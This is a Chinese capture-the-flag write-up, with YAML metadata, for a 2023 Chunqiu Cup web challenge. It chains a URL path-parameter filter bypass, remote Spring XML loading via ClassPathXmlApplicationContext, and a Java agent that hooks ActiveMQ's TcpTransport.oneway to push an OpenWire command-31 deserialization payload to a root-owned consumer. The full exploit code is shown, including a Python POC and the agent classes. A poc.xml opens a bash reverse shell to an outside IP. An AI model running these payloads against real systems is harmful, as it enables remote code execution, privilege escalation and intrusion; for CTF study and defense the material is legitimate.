---
title: 利用 JavaAgent 插桩技术扩大攻击面以及反制攻击者
contest: 春秋杯
year: 2023
difficulty: hard
vuln_type: web_unknown
tags:
- Java-Agent
- instrumentation
- ActiveMQ
- OpenWire
- ClassPathXmlApplicationContext
- SPEL
- URL-parse-bypass
- broker-injection
- SocketHook
- agentmain
attack_chain:
- 'Step 1: 绕 Filter - URL 解析 /api;a=b/changefood 保留 /api 字符但 endpoint 变成 "achangefood" 不等于 "changefood'
- 'Step 2: SPEL 注入 - foodServiceClassName=ClassPathXmlApplicationContext + name=http://vps/poc.xml 触发远程 XML RCE'
- 'Step 3: 通过 broker (player 用户) 攻击 merchant (root 用户) - Java agent 插桩 TcpTransport.oneway'
- 'Step 4: 构造 OpenWire command 31 协议: "1f01360000000000000100" + int2hex(className.length(),4) + string2hex(className) + int2hex(arg.length(),4) + string2hex(arg)'
- 'Step 5: 通过 broker 转发的 command 31 让 merchant 反序列化触发 ClassPathXmlApplicationContext RCE'
- Java agent SocketHook.agentmain 钩子 TcpTransport.oneway, 替换 wireFormat.marshal 后的 dataOut 内容
- '提权: merchant root 启动 → 反弹 shell 读 /flag'
key_payload: '''/api;a=b/changefood + ClassPathXmlApplicationContext + Java agent hook TcpTransport.oneway + OpenWire command 31'''
one_liner: 春秋杯 Java Agent 攻击：URL 解析绕 Filter + SPEL 注入 + Java agent 插桩 ActiveMQ broker 攻击 merchant 提权。
lesson: Java agent 插桩是横向移动的高阶武器；URL 解析差异（; 截断）可绕黑名单 filter；OpenWire 协议 command 31 是反序列化触发点。
quality: high
full_path: 利用JavaAgent插桩技术扩大攻击面以及反制攻击者.full.md
meta_path: 利用JavaAgent插桩技术扩大攻击面以及反制攻击者.meta.md
images_removed: true
images_removed_count: 6
schema_version: v3.0.0-P0
summary: '利用 JavaAgent 插桩技术扩大攻击面以及反制攻击者。春秋杯 Java Agent 攻击：URL 解析绕 Filter + SPEL 注入 + Java agent 插桩 ActiveMQ broker 攻击 merchant 提权。。关键路径：Step 1: 绕 Filter - URL 解析 /api;a=b/changefood 保留 /api 字符但 endpoint 变成 \...'
category: web
subcategory: web_other
tools_used:
- Java
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 6
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/159151.html
reasoning_chain:
- '春秋杯题, Step 1: CustomerFilter 检查 path.startsWith(''/api'') → /api/changefood → 触发点: URL 解析绕过'
- '假设: Tomcat URL 解析 /api;a=b/changefood 保留 /api 字符, 但 endpoint 变成 ''achangefood'' 不等于 ''changefood'' → 动作: 构造 ;bypass → 观察: filter 放行'
- 'Step 2: SPEL 注入 foodServiceClassName=ClassPathXmlApplicationContext + name=http://vps/poc.xml → 假设: Spring SPEL 远程加载 XML → 动作: 起 HTTP server 托管恶意 XML'
- '观察: beanFactory 加载 XML RCE → 但当前是 player 用户 (低权限) → 下一步: 提权到 merchant'
- 'Step 3: 通过 broker (player) 攻击 merchant (root) → Java agent 插桩 TcpTransport.oneway → 触发点: ActiveMQ broker 是反序列化枢纽'
- '动作: SocketHook.agentmain 钩子替换 wireFormat.marshal 后的 dataOut → 假设: 构造 OpenWire command 31 协议 → 观察: merchant 反序列化触发 ClassPathXmlApplicationContext RCE → merchant root 启动 → 读 /flag'
failed_attempts:
- '试图用 ysoserial 直接打 broker → 失败: broker 是中转, 不是 RCE 入口'
- '试图绕过 filter 用 ../ → 失败: 路径规范化在前'
key_observations:
- URL 解析差异 (; 截断) 可绕黑名单 filter (Tomcat/GlassFish 通用)
- SPEL ClassPathXmlApplicationContext 是 Spring 历史 RCE 标准姿势
- Java agent 插桩是横向移动高阶武器 (agentmain 钩 socket)
- ActiveMQ OpenWire command 31 是反序列化触发点 (TcpTransport.oneway 钩子点)
- '低权限提权路径: broker 是中间人, 高权限用户接收恶意消息即 RCE'
prerequisites:
- URL 解析原理 (Tomcat path parameter)
- SPEL 表达式注入 (ClassPathXmlApplicationContext RCE)
- Java agent 插桩 (instrumentation + agentmain)
- ActiveMQ OpenWire 协议结构 (command 31)
---
# 利用JavaAgent插桩技术扩大攻击面以及反制攻击者

> 原文: https://www.ctfiot.com/159151.html
> ID: 159151

解题

在赛后才解出的，通过这道题也学习了JavaAgent技术。

绕过Filter

com.example.customer.filter.CustomerFilter#doFilter中有如下过滤器逻辑

String uri = ((HttpServletRequest)request).getRequestURI().replaceAll("/api", "");
        String endpoint = uri.replaceAll("/", "");
        if (endpoint.equalsIgnoreCase("changefood")) {
            response.getWriter().write("Under construction...");
        } else {
            chain.doFilter(request, response);
       }

可以利用url解析特性来绕过，payload如下：

http://192.168.195.128:
32821/api;a=b/changefood

‍

代码审计 — SPEL注入RCE

com.example.customer.controller.OrderController#change 代码如下

public String change(@RequestParam String foodServiceClassName, @RequestParam String name) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException {
        Class foodServiceClass;
        try {
            foodServiceClass = Class.forName(foodServiceClassName);
        } catch (ClassNotFoundException var5) {
            foodServiceClass = Class.forName("com.example.customer.service.IronBeefNoodleService");
        }

        this.foodService = (FoodService)foodServiceClass.getDeclaredConstructor(String.class).newInstance(name);
        return "Changed to " + foodServiceClassName + " with name " + name;
    }

这里虽然实例化后会强转FoodService报错，但是SPEL注入发生在实例化时，并不影响攻击。使用以下POC完成这一阶段的攻击：

import requests
url = "http://192.168.195.128:
32821/"
def change():
    u = url + "api;a=b/changefood"
    r = requests.post(u,{"foodServiceClassName":"org.springframework.context.support.ClassPathXmlApplicationContext","name":"http://8.134.146.39:
8000/poc.xml"}).text
    print(r)

change()

poc.xml

<?xml version="1.0" encoding="UTF-8" ?>

    
        <constructor-arg >
            <list>
                    <value>bash</value>
                    <value>-c</value>
                    <value><![CDATA[bash -i >& /dev/tcp/8.134.146.39/6666  0>&1]]></value>
            </list>
        </constructor-arg>
    


然后获得一个反弹shell，但是/flag没有读权限，需要提权。

从通过Java agent技术控制broker攻击merchant进程提权

通过查看/start.sh可以知道，除了merchant进程，其它进程都是由player普通用户启动的。

因此需要攻击merchant进程来达到提权效果，对merchant.jar进行代码审计发现代码量不多，关键代码如下：

public static void main(String[] args) throws JMSException {
        ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(args[0]);
        connectionFactory.setTrustedPackages(List.of("com.example.customer.entity"));
        Connection connection = connectionFactory.createConnection();
        connection.start();
        Session session = connection.createSession(false, 1);
        Destination destination = session.createQueue("Orders");
        MessageConsumer consumer = session.createConsumer(destination);
        consumer.setMessageListener((message) -> {
            if (message instanceof TextMessage) {
                TextMessage textMessage = (TextMessage)message;

                try {
                    XStream xstream = new XStream(new StaxDriver());
                    xstream.allowTypesByWildcard(new String[]{"com.example.customer.entity.*"});
                    OrderEntity entity = (OrderEntity)xstream.fromXML(textMessage.getText());
                    take(entity, args[1]);
                } catch (JMSException var5) {
                    var5.printStackTrace();
                }
            }

        });
        System.out.println("Waiting for messages...");
    }

这里容易让人想到打xstram反序列化，但是看了版本是最新的打不动，于是考虑到这里的consumer连接到broker后一直处于监听状态，activemq的broker和client用的都是一样的序列化和反序列化逻辑，连接到broker的客户端也会受到CVE-2023-46604的影响，但是一般情况下broker向consumer发送的数据并不是我们可以控制的，虽然我们可以通过向Orders队列发送消息的方式和root权限的consumer进行通信，但是无法将command为31的异常消息发送给broker后转发到consumer上。但是因为broker也是player权限启动的，因此有以下两个思路：

将broker进程杀掉，61616端口起一个恶意服务发送数据给consumer，但是这个过程会造成连接中断。

使用Java agent技术在broker发送数据处插桩来完成恶意数据的发送，不会照成连接中断。


```
String uri = ((HttpServletRequest)request).getRequestURI().replaceAll("/api", "");
        String endpoint = uri.replaceAll("/", "");
        if (endpoint.equalsIgnoreCase("changefood")) {
            response.getWriter().write("Under construction...");
        } else {
            chain.doFilter(request, response);
       }
http://192.168.195.128:
32821/api;a=b/changefood
public String change(@RequestParam String foodServiceClassName, @RequestParam String name) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException {
        Class foodServiceClass;
        try {
            foodServiceClass = Class.forName(foodServiceClassName);
        } catch (ClassNotFoundException var5) {
            foodServiceClass = Class.forName("com.example.customer.service.IronBeefNoodleService");
        }

        this.foodService = (FoodService)foodServiceClass.getDeclaredConstructor(String.class).newInstance(name);
        return "Changed to " + foodServiceClassName + " with name " + name;
    }
import requests
url = "http://192.168.195.128:
32821/"
def change():
    u = url + "api;a=b/changefood"
    r = requests.post(u,{"foodServiceClassName":"org.springframework.context.support.ClassPathXmlApplicationContext","name":"http://8.134.146.39:
8000/poc.xml"}).text
    print(r)

change()
<?xml version="1.0" encoding="UTF-8" ?>

    
        <constructor-arg >
            <list>
                    <value>bash</value>
                    <value>-c</value>
                    <value><![CDATA[bash -i >& /dev/tcp/8.134.146.39/6666  0>&1]]></value>
            </list>
        </constructor-arg>
    

public static void main(String[] args) throws JMSException {
        ActiveMQConnectionFactory connectionFactory = new ActiveMQConnectionFactory(args[0]);
        connectionFactory.setTrustedPackages(List.of("com.example.customer.entity"));
        Connection connection = connectionFactory.createConnection();
        connection.start();
        Session session = connection.createSession(false, 1);
        Destination destination = session.createQueue("Orders");
        MessageConsumer consumer = session.createConsumer(destination);
        consumer.setMessageListener((message) -> {
            if (message instanceof TextMessage) {
                TextMessage textMessage = (TextMessage)message;

                try {
                    XStream xstream = new XStream(new StaxDriver());
                    xstream.allowTypesByWildcard(new String[]{"com.example.customer.entity.*"});
                    OrderEntity entity = (OrderEntity)xstream.fromXML(textMessage.getText());
                    take(entity, args[1]);
                } catch (JMSException var5) {
                    var5.printStackTrace();
                }
            }

        });
        System.out.println("Waiting for messages...");
    }
public void oneway(Object command) throws IOException {
        this.checkStarted();
        this.wireFormat.marshal(command, this.dataOut);
        this.dataOut.flush();
    }
package com.test;

import java.lang.instrument.Instrumentation;
import java.util.Base64;
import java.util.jar.JarFile;

public class SocketHook {
    public static void agentmain(String agentArg, Instrumentation inst) throws Exception {
        String hookClass = "org.apache.activemq.transport.tcp.TcpTransport";
        String hookMethod = "oneway";
        String targetClass = "org.springframework.context.support.ClassPathXmlApplicationContext";  //需要调用的类，这里只能选择构造方法只接收一个String参数的类
        String arg = "http://8.134.146.39:
8000/poc1.xml";  // 传入的参数
        String data = "1f01360000000000000100" + int2hex(targetClass.length(),4) + string2hex(targetClass)  + int2hex(arg.length(),4) + string2hex(arg);
        data = int2hex(data.length()/2,8) + data;
        String base64str = Base64.getEncoder().encodeToString(hex2bytes(data));
        String hookCode = "java.io.OutputStream out = this.socket.getOutputStream();out.flush();" +
                "out.write(java.util.Base64.getDecoder().decode("" + base64str + ""));" +
                "out.flush();System.out.println("payload send done!!!");";
        inst.appendToBootstrapClassLoaderSearch(new JarFile("/tmp/x.jar"));  // 需要让启动类加载器找到agent的jar包，否则缺少各种依赖
        SocketTransformer socketTransformer = new SocketTransformer(hookClass,hookMethod,hookCode,true);
        inst.addTransformer(socketTransformer,true);
        Class[] cs = inst.getAllLoadedClasses();
        boolean flag = false;
        for (Class a : cs){
            if (a.getName().equals(hookClass)){
                flag = true;
                try {
                    inst.retransformClasses(a);  // 重转换类，因为题目中在我们attach之前就已经加载了org.apache.activemq.transport.tcp.TcpTransport 需要进行重转换才能更新字节码
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public static String int2hex(int i, int n) {
        if (n != 4 && n != 8) {
            throw new IllegalArgumentException("n should be 4 or 8");
        }
        return String.format("%0" + n + "x", i);
    }

    public static String string2hex(String s) {
        StringBuilder hexString = new StringBuilder();
        for (char ch : s.toCharArray()) {
            hexString.append(String.format("%02x", (int) ch));
        }
        return hexString.toString();
    }
    public static byte[] hex2bytes(String hex) {
        if (hex.length() % 2 != 0) {
            throw new IllegalArgumentException("Hex string must have an even length");
        }

        byte[] bytes = new byte[hex.length() / 2];
        for (int i = 0; i < bytes.length; i++) {
            int index = i * 2;
            int val = Integer.parseInt(hex.substring(index, index + 2), 16);
            bytes[i] = (byte) val;
        }

        return bytes;
    }

}
package com.test;

import javassist.*;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

public class SocketTransformer implements ClassFileTransformer {
    private ClassPool classPool;
    private String hookClass;
    private String hookMethod;
    private String hookCode;
    private boolean after;
    public SocketTransformer(String hookClass, String hookMethod, String HookCode,boolean after) throws NotFoundException {
        this.hookClass = hookClass;
        this.hookMethod = hookMethod;
        this.hookCode = HookCode;
        this.classPool = new ClassPool();
        this.classPool.appendClassPath(new LoaderClassPath(this.getClass().getClassLoader()));
        this.classPool.appendClassPath("/opt/apache-activemq/lib/activemq-client-5.17.5.jar"); // 将依赖添加到classpath中，不加这条ssist找不到activemq相关的类
        this.classPool.appendSystemPath();
        this.after = after;
    }

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain, byte[] classfileBuffer) {
        classPool.appendClassPath(new LoaderClassPath(loader));
        if (className.equals(this.hookClass.replace(".","/"))) {
            try {
                CtClass ctClass = this.classPool.get(this.hookClass);
                CtMethod ctMethod = ctClass.getDeclaredMethod(this.hookMethod);
                if (this.after){
                    ctMethod.insertAfter(this.hookCode);
                }else {
                    ctMethod.insertBefore(this.hookCode);
                }
                byte[] byteCode = ctClass.toBytecode();
                ctClass.detach();
                return byteCode;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return null;
    }
}
<?xml version="1.0" encoding="UTF-8"?>

    <modelVersion>4.0.0</modelVersion>

    <groupId>com.test</groupId>
    <artifactId>SocketHook</artifactId>
    <version>1.0-SNAPSHOT</version>

    
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
        UTF-8
    

    <dependencies>
        <!-- 其他依赖项 -->

        <!-- Javassist 依赖项 -->
        <dependency>
            <groupId>org.javassist</groupId>
            <artifactId>javassist</artifactId>
            <version>3.27.0-GA</version> <!-- 使用最新版本 -->
        </dependency>

        <!-- 其他依赖项 -->
    </dependencies>

    
        
            
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-jar-plugin</artifactId>
                <version>3.2.0</version> <!-- 使用最新版本 -->
            

            
                <artifactId>maven-assembly-plugin</artifactId>
                <version>3.3.0</version> <!-- 使用最新版本 -->
                <configuration>
                    <descriptorRefs>
                        <descriptorRef>jar-with-dependencies</descriptorRef>
                    </descriptorRefs>
                    <archive>
                        <manifestEntries>
                            <Agent-Class>com.test.SocketHook</Agent-Class>
                            <Can-Redefine-Classes>true</Can-Redefine-Classes>
                            <Can-Retransform-Classes>true</Can-Retransform-Classes>
                        </manifestEntries>
                    </archive>
                </configuration>
                <executions>
                    <execution>
                        make-assembly
                        package
                        <goals>
                            <goal>single</goal>
                        </goals>
                    </execution>
                </executions>
            
        
    


chmod +x ./jattach
./jattach 42 load instrument false /tmp/x.ajr
String hookCode = "if (this.socket.getRemoteSocketAddress().toString().contains("192.168.195.66")){java.io.OutputStream out = this.socket.getOutputStream();out.flush();" +
                "out.write(java.util.Base64.getDecoder().decode("" + base64str + ""));" +
                "out.flush();System.out.println("payload send done!!!");}";
String hookCode = "if (command.toString().contains("xxx")){java.io.OutputStream out = this.socket.getOutputStream();out.flush();" +
                "out.write(java.util.Base64.getDecoder().decode("" + base64str + ""));" +
                "out.flush();System.out.println("payload send done!!!");}";
package com.example;

import org.apache.activemq.ActiveMQConnection;
import org.apache.activemq.ActiveMQConnectionFactory;
import org.apache.activemq.command.ExceptionResponse;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import javax.jms.Connection;

public class ExceptionResponseExploit {

    public static void main(String[] args) throws Exception {

        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory("tcp://192.168.195.128:
32824");

        Connection connection = factory.createConnection();
        connection.start();

        Exception obj2 = new ClassPathXmlApplicationContext("http://127.0.0.1:
8080/poc.xml");

        ExceptionResponse response = new ExceptionResponse(obj2);

        response.setException(obj2);

        ((ActiveMQConnection)connection).getTransportChannel().oneway(response);

        connection.close();

    }

}
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]